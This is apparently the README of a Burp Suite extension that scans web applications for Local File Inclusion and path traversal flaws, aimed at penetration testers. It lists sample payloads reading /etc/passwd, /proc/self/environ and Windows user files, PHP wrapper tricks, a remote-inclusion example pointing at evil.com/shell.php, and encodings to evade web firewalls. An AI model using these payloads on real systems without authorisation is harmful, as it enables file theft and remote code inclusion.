# SAPLAR
SAPLAR - LFI &amp; Path Traversal Scanner


## Project Overview

SAPLAR is a powerful Burp Suite extension designed to detect Local File Inclusion (LFI) and Path Traversal vulnerabilities in web applications. It is specifically built for penetration testers, bug bounty hunters, and security researchers who need an automated, flexible, and highly efficient LFI scanner within Burp Suite.

This tool injects LFI payloads into various parts of the HTTP request, including:

- **GET Parameters**
- **POST Data**
- **Cookies**
- **HTTP Headers**

SAPLAR analyzes the server response to identify common LFI signatures and indicators. It features automated active scanning, manual scanning, and multiple encoding options to bypass security filters.


## Features

1️⃣ Multi-Vector LFI Injection
SAPLAR automatically injects payloads into multiple request locations:

Query Parameters (?file=../../etc/passwd)
POST Body (file=../../etc/passwd)
Cookies (session=../../etc/passwd)
HTTP Headers (User-Agent, Referer, X-Forwarded-For, Authorization, etc.)
2️⃣ Wide LFI Payload Database
Includes hundreds of payloads targeting:

Linux systems (/etc/passwd, /proc/self/environ, /var/log/auth.log)
Windows systems (C:\Windows\win.ini, C:\boot.ini, C:\Users\Administrator\NTUSER.DAT)
PHP Wrappers (php://filter/convert.base64-encode/resource=index.php)
Log file extraction (../../../../var/log/apache2/access.log)
Remote inclusion possibilities (http://evil.com/shell.php)
3️⃣ Automatic Encoding & WAF Bypass
Payloads can be encoded automatically to bypass security protections like WAF (Web Application Firewalls) and input validation filters.

Base64 Encoding
URL Encoding (Single, Double, Triple)
HEX Encoding
Unicode Encoding
4️⃣ Signature-Based Response Analysis
SAPLAR scans responses for known LFI indicators, such as:

🔹 System Users: "root:x:0:0:", "NT AUTHORITY\\SYSTEM"
🔹 Configuration Files: "[boot loader]", "kernel.core_pattern"
🔹 Error Messages: "failed to open stream", "No such file or directory"
🔹 False Positive Filtering: Detects standard 403/404 responses

5️⃣ Header & Cookie-Based Injection
Injects LFI payloads into common headers:
User-Agent
Referer
X-Forwarded-For
Authorization
X-Api-Key
Accept-Charset
Cookie Manipulation: Tries injecting LFI payloads into cookie values.
6️⃣ GUI Integration in Burp Suite
SAPLAR provides a user-friendly graphical interface in Burp Suite.

✅ A dedicated LFI Scan tab to manage scans.
✅ Right-click on any request in Burp and select "Scan for LFI".
✅ Real-time exploit status updates (Exploited, Not Vulnerable, Possible LFI).

